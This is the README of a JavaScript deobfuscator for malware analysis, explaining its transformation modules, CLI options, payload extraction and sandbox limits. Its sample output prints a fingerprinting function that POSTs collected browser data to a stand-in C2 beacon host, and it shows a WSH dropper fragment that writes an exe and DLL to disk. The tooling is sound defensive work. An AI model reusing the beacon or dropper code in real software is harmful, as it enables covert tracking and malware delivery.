<p align="center">
  <img src="assets/banner.png" alt="untangle" width="100%">
</p>

<p align="center">
  <a href="https://github.com/CtxtArc/untangle/actions"><img src="https://github.com/CtxtArc/untangle/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT">
</p>

A JavaScript deobfuscator for malware reversing, built the way
[restringer](https://github.com/HumanSecurity/restringer) is: parse to an AST, run small
targeted transformation modules until the code stops changing, and evaluate the parts
that can only be resolved by running them inside a sandbox.

```
$ untangle --dyn samples/obfuscated.js
function collect() {
  const _0x7a1b = {
    ua: navigator.userAgent,
    lang: navigator.language,
    id: getId()
  };
  return JSON.stringify(_0x7a1b);
}
function getId() {
  var _0x9f8e = localStorage.getItem('uid');
  if (!_0x9f8e) {
    _0x9f8e = Math.random().toString(36).substring(2);
    localStorage.setItem('uid', _0x9f8e);
  }
  return _0x9f8e;
}
fetch('https://c2.example.invalid/beacon', { method: 'POST', body: collect() })...
```

The input is ~100 lines of obfuscator.io-style output: a rotated base64 string array, a
self-redefining decoder with cache, wrapper functions, proxy objects, control-flow
flattening and dead-code injection. The output behaves the same as the input; the test
suite checks this by running both.

## Install / run

Requires Node.js 22 or newer.

```sh
git clone https://github.com/CtxtArc/untangle && cd untangle
npm install
npm test

./bin/untangle.js sample.js -o clean.js --stats     # static only: nothing from the sample runs
./bin/untangle.js --dyn sample.js -o clean.js       # also evaluate decoders/loops in the sandbox (isolated VM!)
./bin/untangle.js dropper.js --extract-blobs blobs  # also pull embedded payloads out to files
./bin/untangle.js --dyn sample.js --rename          # also give _0x4f1e-style names readable ones
cat sample.js | ./bin/untangle.js -
```

or install the CLI globally: `npm install -g github:CtxtArc/untangle`.

As a library:

```js
import { deobfuscate } from 'untangle';
const { code, stats, pending } = deobfuscate(src);                 // static only
const full = deobfuscate(src, { dynamic: true });                  // + sandboxed evaluation
const named = deobfuscate(src, { dynamic: true, rename: 'auto' }); // + readable names
```

Payload extraction from code: `import { extractBlobs } from 'untangle/blobs'`.

The result also has `pending` (per sandboxed module, how many evaluations static mode skipped),
`problems` (modules that crashed and were disabled for the run; the CLI always prints these),
`renamed` (bindings renamed by `rename`), `iterations` and `changed`.

Options: `dynamic` (default `false`), `rename` (`false`, `'auto'` or `'all'`), `maxIterations`,
`removeDeadCode`, `keepGlobals`, `disable: ['moduleName']`, `verbose`,
`sandbox: { timeout, preludeTimeout, checkSideEffects }`.

## CLI options

| option | does |
|---|---|
| `-o, --output <file>` | write the result to a file (default: stdout) |
| `--dyn` | also run the sandboxed modules, which **execute** fragments of the sample (decoders, builtin calls, decode loops, packer bodies). Off by default; isolated VM only |
| `--rename` | give machine-generated names (`_0x4f1e`, `PREFIX38299`) readable names from their use, see [Readable names](#readable-names---rename) |
| `--rename-all` | like `--rename`, but every eligible binding, not only generated-looking ones |
| `--extract-blobs <dir>` | move long string literals into files, decode base64, identify them, write `manifest.json` |
| `--blob-min <n>` | minimum literal length for `--extract-blobs` (default 2048) |
| `--keep-globals` | do not remove (or rename) top-level declarations |
| `--no-dead-code` | do not remove unused declarations at all |
| `--disable <a,b,...>` | disable modules by name (see `--list-modules`) |
| `--max-iterations <n>` | iteration cap (default 100) |
| `--timeout <ms>` | per-call sandbox timeout (default 1000) |
| `--no-side-effect-check` | accept decoder results even if a call changes global state |
| `-s, --safe` | static only (the default; kept for compatibility) |
| `--stats` | per-module change counts (and renamed bindings) on stderr |
| `-v, --verbose` | log every module run on stderr |
| `--list-modules`, `--version`, `-h, --help` | |

Input may be UTF-8, UTF-8 with BOM, UTF-16 LE/BE (as WSH scripts often are) or ANSI; the
detected encoding is printed when it is not plain UTF-8. JScript-only syntax is accepted:
assignments to a call (`dict.Item("k") = v`, `sh.Environment("User")("X") = v`), which WSH allows
for parameterised COM properties, are parsed and written back exactly as they were. If a module crashes, it is disabled for
the rest of the run and untangle prints `warning: <module> crashed and was disabled ...`: the
output is then valid but may be less complete. Please report those (with a SHA-256, not the sample).

## Modules

`untangle --list-modules` lists them. Static modules run to a fixpoint. With `--dyn`, the
sandboxed modules then run once and the cycle repeats while anything changes; without it they
only report what they would have evaluated.

| module | does |
|---|---|
| `foldConstants` | `!![]`, `0x1f + 1`, `'a' + 'b'`, `typeof 'x'`, `void 0`, template literals |
| `normalizeComputed` | `a['b']` → `a.b`, `{'k': 1}` → `{k: 1}` (keeps `__proto__` / `constructor` semantics) |
| `simplifyBranches` | static `if` / `?:` / `&&` / `\|\|` / `??` / `while(false)`, keeping hoisted `var`s; empty branches: `if (c) {} else S` → `if (!c) S` |
| `splitSequences` | `a(), b()` → `a(); b();`, `return a(), b` → `a(); return b`, `var a, b` → two decls |
| `localizeTemps` | implicit globals that are only a function's scratch variables (`function f(x, y) { t = g(y); return x & t; }`) become `var` locals: every reference is in that function, every read follows a plain `t = …;` in the same call, the function cannot be re-entered while it runs, the name is no host global (`location`, `name`, `onload`, …) and nothing reaches globals by name |
| `normalizeDeclarations` | `x = v; …; var x;` (declarations hoisted to the end of the function, `const` turned into assignments) → `var x = v;` at the assignment, when it sits at the top level of the function body |
| `mergeAccumulators` | `var s = ''; s += 'ab'; s += 'cd'` → `var s = 'abcd'` for runs of literal appends with no read in between (linear even for 10k+ appends) |
| `splitRedeclarations` | `var s = 'a'; use(s); var s = 'b'; use(s)`, `s = s.split('#').join('')` and `s += x` → `s` / `s_1` / `s_2`, when the definitions are straight-line (bindings with over 1000 definitions are left alone) |
| `foldJoinLoops` | `for (var i = 0; i < a.length; i++) { s += a[i]; }` → `s += a.join('')` when `a` is a constant array of strings and `i` is not used after the loop |
| `inlineConstants` | `var s = 'x'; f(s)` → `f('x')` (single def, never reassigned), and `s = 'x'; f(s)` when that plain assignment is the binding's only write (`str1 = 'pow'; str2 = 'er'; … run(str1 + str2 + …)` → `run('power…')`); only into reads that surely run after it |
| `resolveMemberAccess` | `['a','b'][1]`, `'abc'.length`, and constant arrays that never escape or mutate |
| `inlineProxyVariables` | `var b = a; b()` → `a()` when `a` resolves to the same binding at every use |
| `inlineSingleUseTemps` | `t = decode(x); eval(t)` → `eval(decode(x))` when `t` is written and read exactly once, in adjacent statements, with only constants evaluated before the read; a side-effect-free value (`v5 = exePath`) may also move past plain copies that don't write what it reads (object / array / function literals stay bound for the passes that resolve them) |
| `resolveProxyObjects` | obfuscator.io proxy objects: `o.aBc(x, y)` → `x + y`, `o.k` → `'log'` |
| `inlineProxyFunctions` | single-`return` wrappers: `w('k', 0x20)` → `dec(0x20 - 0x1a, 'k')`; single-statement wrappers called as statements: `run(x);` → `eval(dec(x));` (with `eval` only if the wrapper has no locals) |
| `unflattenControlFlow` | `'2\|0\|1'.split('\|')` + `while(true) switch(o[i++])` dispatchers → straight-line code |
| `unwrapEval` | `eval('code')` → code, `Function('code')()` → IIFE, `new Function('code').call(x)` → `(function () { code }).call(x)` (only when no local would be captured) |
| `foldBuiltinCalls` | static: `'dlrow'.split('').reverse().join('')`, `blob.split('♉').join('')`, `String.fromCharCode(…)`, `atob`, `parseInt`, … on literal data, via a whitelist interpreter (no callbacks, size caps; regexes only when they are a plain literal string, like `/'/g`) |
| `splitJoinConcat` ⚠ | `(folder + '\\♉♉ev♉♉il.exe').split('♉♉').join('')` → `folder + '\\evil.exe'` |
| `removeUnreachable` | statements after `return` / `throw` / `break` / `continue` / `WScript.Quit()` |
| `removeDeadCode` | unused bindings, even when declared many times, plus statements that only write to them (`junk += '…'`, `obj[k] = {…}`, `x.k++`, `arr.push(…)` / `unshift` / `reverse` on a fresh array), never-read `this.NAME = …` globals, self-feeding junk (`if (/k/.test(v)) v += 'k'; else v = 'k';`, `try { v = v.concat('k') } catch (e) {…}`, …), and padding IIFEs that only write onto their own fresh arguments (`(function (a, b) { a[b] = {…}; }(function () {…}))`); all-or-nothing, and never for locals a direct `eval` could see |
| `cleanup` | empty statements, no-op expressions, nested blocks |
| `resolveBuiltinCalls` 🔒 | what `foldBuiltinCalls` refuses (e.g. regex arguments), in the sandbox; follows constant variables, so a 12-step `a.split('?').join('')` chain resolves in one evaluation |
| `resolveConstantLoops` 🔒 | `var out = ''; for (…) out += String.fromCharCode(parseInt(blob.substr(i, 2), 16) ^ key.charCodeAt(…))` → `var out = '<decoded>'` |
| `resolveEvalArguments` 🔒 | `eval(function(p,a,c,k,e,d){...}(...))` (Dean Edwards packer), `eval(atob(...))` |
| `resolveDecoderCalls` 🔒 | string-array decoders and other pure helpers: evaluates calls with constant arguments (literals, literal arrays/objects, constant string bindings, literal arrays bound to a name read only there, pure string-method chains such as `'ab'.concat(x).toUpperCase()`, nested calls such as `cipher(unpack('…'), unpack('…'))`, and `f(…).length`) together with their context; JScript `Scripting.Dictionary` is emulated; results may be primitives or arrays of primitives; afterwards removes decoder machinery (string arrays, decoders, rotators) that nothing else uses and that touches nothing but itself |

🔒 = evaluates code from the sample inside the sandbox; only with `--dyn`. ⚠ = heuristic: exact only if the runtime
part of the concatenation never contains a separator character; it only fires for separators
without letters or digits that actually occur in the literals. `--disable splitJoinConcat` turns it off.

## Embedded payloads

Droppers carry their payloads as multi-megabyte string literals. `--extract-blobs <dir>` moves
every string literal of at least `--blob-min` characters (default 2048) into a file, decodes
base64, identifies the result (PE with arch / EXE vs DLL / timestamp, ELF, ZIP, gzip, PDF, RAR,
7z, Lua and LuaJIT bytecode) and replaces the literal in the output with a placeholder carrying
its SHA-256. Text payloads are labelled with their language when it is clear (Lua source,
PowerShell, VBScript, JavaScript, XML, HTML). `manifest.json` lists everything (it is only
written when something was extracted). Nothing extracted is executed.

```
$ untangle --dyn dropper.js --extract-blobs blobs -o clean.js
blob 1: text (Lua source), 731701 bytes, sha256 <64 hex> -> blob1_<sha12>.bin
blob 2: PE x64 EXE, timestamp 1970-01-01, 27916 bytes, sha256 <64 hex> -> blob2_<sha12>.bin
blob 3: PE x64 DLL, timestamp 1970-01-01, 449691 bytes, sha256 <64 hex> -> blob3_<sha12>.bin
```

### How decoder resolution works

For each function called with constant arguments, `resolveDecoderCalls` collects its
**context**: its declaration, the declarations of every binding it references (transitively),
`name = function () {}` reassignments, and IIFEs that receive one of those bindings as an
argument (the string-array rotators). The context runs once as a prelude in a fresh
sandbox, then every call is evaluated **twice**. A result is accepted only if:

- it is a string, number or boolean, or an array of them (at most 200 000 items), which the
  next decoder in a chain can take as a constant argument,
- both evaluations return the same value (`Math.random` and `Date` throw in the sandbox),
- the call never looks at a function's source (`Function.prototype.toString` throws in the sandbox:
  the functions there are the deobfuscated ones, so `arguments.callee.toString().length != 1731`
  anti-tamper checks would see the wrong text),
- neither evaluation changes global state, apart from a global function being replaced by
  another function (self-redefining decoders).

Constant arguments are primitives, fresh array / object literals of constants (the sandbox gets
its own copy, so whatever the call does to them is invisible to the program), bindings that are
never reassigned and hold a primitive (`var buf = '<29 KB>'`, substituted by value), bindings that
hold an array / object literal and are read nowhere else (`var data = [104, ...]; dec(data, 7)`),
pure string methods (`concat`, `slice`, `split`, `join`, `replace`, `charAt`, `toUpperCase`, …) on
constant receivers, and nested
calls to other functions with constant arguments, whose contexts join the prelude. Only the
outermost such call is evaluated, so a three-stage chain like

```js
var buf = streamCipher(unb64('<38 KB>'), unb64('key…'), unb64('nonce…'));   // -> '<29 KB plaintext>'
var api = [slice(buf, 21081, [63, 56, 4, 21, 80]), ...];                     // -> ['Sleep', ...]
if (count(keep(['cfg', 'node', 'lane'])) > 0) ...                            // -> if (11 > 0)
```

resolves in two rounds. A binding that holds an array and is also read elsewhere is never treated
as constant (the call could mutate it).

JScript decoders often keep their state in a `Scripting.Dictionary`
(`var d = new ActiveXObject('Scripting.Dictionary'); d.Item('s') = st; ...`). The sandbox emulates
that one object (`Item`, `Add`, `Exists`, `Remove`, `RemoveAll`, `Keys`, `Items`, `Count`, and the
`d.Item(k) = v` call assignment); every other `ActiveXObject` throws, so a helper that touches the
file system or the shell is never evaluated.

When every call to a decoder is resolved and nothing else uses its context, the decoder,
its string array and its rotator are removed, except for top-level decoders in a script that
reaches globals by computed name (`this[k]()` could still call them).

Once a layer such as `new Function(rev5(rev6(rev7(decodeHex('…'))))).call(root)` folds into
`new Function('<code>').call(root)`, `unwrapEval` turns it into
`(function () { <code> }).call(root)` when none of the code's free names would be captured by an
enclosing local, so the next stage is deobfuscated in place.

## Readable names (`--rename`)

Obfuscators replace every name with noise. After deobfuscation, `--rename` gives those bindings
names derived from how they are used. It runs once on the final code and needs no evaluation, so
it works the same with or without `--dyn`.

```
$ untangle --dyn --rename samples/fib.js          $ untangle --dyn samples/fib.js
(function () {                                    (function () {
  function fn1(arg1) {                              function _0x199140(_0x4676b2) {
    if (arg1 <= 1)                                    if (_0x4676b2 <= 1)
      return arg1;                                      return _0x4676b2;
    return fn1(arg1 - 1) + fn1(arg1 - 2);             return _0x199140(_0x4676b2 - 1) + ...
  }                                                 }
  for (var i = 0; i < 10; i++) {                    for (var _0x2444ab = 0; _0x2444ab < 10; ...
```

and on a WSH dropper:

```js
var shell = new ActiveXObject('WScript.Shell');
var myDocuments = shell.SpecialFolders('MyDocuments');
var fso = new ActiveXObject('Scripting.FileSystemObject');
var exePath = myDocuments + '\\AYTRJHTPTRRUBMPC.exe';
var dllPath = myDocuments + '\\lua51.dll';
...
var stream = new ActiveXObject('ADODB.Stream');
```

| the binding holds / is | name |
|---|---|
| `new ActiveXObject(…)`, `CreateObject(…)`, `GetObject('new:…')` | `shell`, `fso`, `stream`, `http`, `xmlDoc`, `network`, `scheduler`, `shellApp`, `dict`, `wmi`, … |
| `ExpandEnvironmentStrings('%TEMP%')`, `SpecialFolders('MyDocuments')` | `temp`, `myDocuments` |
| a string or concatenation ending in `.exe` / `.dll` / `.ps1` / … | `exePath`, `dllPath`, `ps1Path`, … |
| other paths (`C:\…`, `…\`, `%ENV%`) / `http(s)://…` / `<?xml …` / a command line | `path`, `url`, `xml`, `cmdLine` |
| a string of 1 KB or more / other strings | `payload` / `str` |
| `x.indexOf(…)`, `x.substring(…)`, `x.split(…)`, `x.length`, `Math.*` | `pos`, `part`, `parts`, `len`, `num` |
| `x.CreateTextFile(…)`, `x.createElement(…)`, `new Date()`, `x.getFoo()`, `x.Foo` | `file`, `element`, `date`, `foo`, `foo` |
| a `for` loop counter / `for…in` key / `catch` parameter | `i`, `j`, `k`, … / `key` / `err` |
| a function / parameter / array / object / anything else | `fn1`, `arg1`, `arr`, `obj`, `v1`, … |

`--rename` only touches names that look machine-generated (`_0x…` hex, a prefix followed by 3+
digits like `AYTRJHTPTRRUBMPC38299`, long all-caps runs, `IlI1lI`-style, runs of two or more
underscores like `___` or `_______________1`, and names of 12+ characters holding a run of 4+ digits
like `q45qsdfus8465dfsfgth`; a lone `_` is left alone). Random short names such
as `LkFWdl` cannot be told apart from human ones reliably: use `--rename-all` to rename every
eligible binding.

It never changes behaviour:

- only declared bindings are renamed: never implicit globals, properties or object keys
  (shorthand `{ a }` becomes `{ a: renamed }`);
- every new name is unique in the whole program (`shell`, `shell1`, …), so nothing is shadowed
  or captured, and reserved words and well-known globals (`WScript`, `console`, …) are never used;
- nothing is renamed where code could reach it by name at runtime: locals of a function that
  contains a direct `eval`, and all top-level bindings when the script uses `eval`, `with` or
  `this[expr]` (or `--keep-globals` is given).

The test suite renames acorn, esprima and estraverse with `--rename-all` and checks they still
behave identically.

## Safety model

Every transform is written to preserve behaviour. Bindings are tracked with eslint-scope,
so shadowing, reassignment, hoisting/TDZ, argument evaluation order, recursion, strict mode,
and `__proto__`/`constructor` keys are all checked before anything is rewritten. When a
module produces code that does not parse, it is reverted and disabled for the rest of the run.

Constants are only inlined into reads that surely run after the declaration: not past a
conditional block that holds the declaration, and not into a hoisted function that code before
the declaration can call (directly, through other functions, aliases or callbacks). Scripts that
reach globals by computed name (`this[k]`, `window[k]`, `with`) keep every top-level binding, and
no top-level constant is inlined there either (`this[k] = …` could overwrite it). A string of code
passed to `setTimeout` / `setInterval` / `setImmediate` / `execScript` counts too: it runs in the
global scope and may name any global.

Host globals (`location`, `name`, `status`, `onload`, `WScript`, …) are never treated as scratch
variables: `location = url` navigates even when nothing reads `location` again. In strict code a
write to an undeclared name throws, so such writes are never removed or moved either. The global object
is followed through the usual wrappers: in `(function () { var root = this; ... }).call(this)` only
a computed access or escape of the inner `this` / `root` counts (an arrow's `this` is the outer one).

**Static by default:** without `--dyn` nothing from the input is executed; untangle only parses,
rewrites and folds literal data with a whitelist interpreter.

**Sandbox (`--dyn`):** evaluation happens in a separate `node` process started with the permission
model (`--permission`: no filesystem writes, no child processes, workers or addons), an
empty environment and a memory cap. Inside that process the code runs in a `vm` context
whose global is a null-prototype object, so the classic
`this.constructor.constructor('return process')()` escape finds nothing. Every evaluation
has a timeout.

**This is defense in depth, not a security boundary.** Node's permission model does not
restrict network access, and `vm` is not designed to contain hostile code. Run untangle
with `--dyn` on live samples only inside a disposable analysis VM.

## Known limits / next steps

- Proxy objects built by later assignment (`o = {}; o.k = ...`) are not resolved yet, only literals.
- Anti-tamper checks on a function's own source (`arguments.callee.toString().length != 1731`) are
  never evaluated, but they are not removed either: in the output those functions have a different
  source, so running the output takes the "tampered" branch. Read such checks as dead guards.
- Scripts that look globals up by name (`for (k in this)`, `this[k](...)`) keep every global as is:
  implicit-global temps stay global there and helpers that write them are not resolved
  (`--no-side-effect-check` overrides the latter once you have read them).
- `localizeTemps` needs a plain write before each read; a value written only in some branches
  (`switch` without `default`) stays global.
- Constant arrays passed to other functions are not folded (`var a = ['Sleep', ...]; WScript[a[0]](…); helper(a)`):
  that needs proving the callee only reads them.
- obfuscator.io `selfDefending` / `debugProtection` code can hang the prelude: it times out and
  that decoder is skipped. Use `--disable` or strip the guard first.
- Decoders that keep a cache in a global plain object are rejected by the side-effect check:
  use `--no-side-effect-check` when you have checked the decoder by hand.
- No JSFuck / AAEncode-specific modules, and JScript.Encode (`#@~^…^#~@`) is detected but not
  decoded yet.
- After every module that changes something the whole program is regenerated and re-parsed (that
  keeps scope information exact). On multi-megabyte samples this dominates the run time (about
  40 s for a 5 MB dropper); re-parsing only the changed regions is on the list.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the architecture and how to write a module, and
[SECURITY.md](SECURITY.md) for the sandbox threat model and how to report an escape. Please never
attach live samples to issues: a minimal synthetic snippet and a SHA-256 are enough.

## License

[MIT](LICENSE)
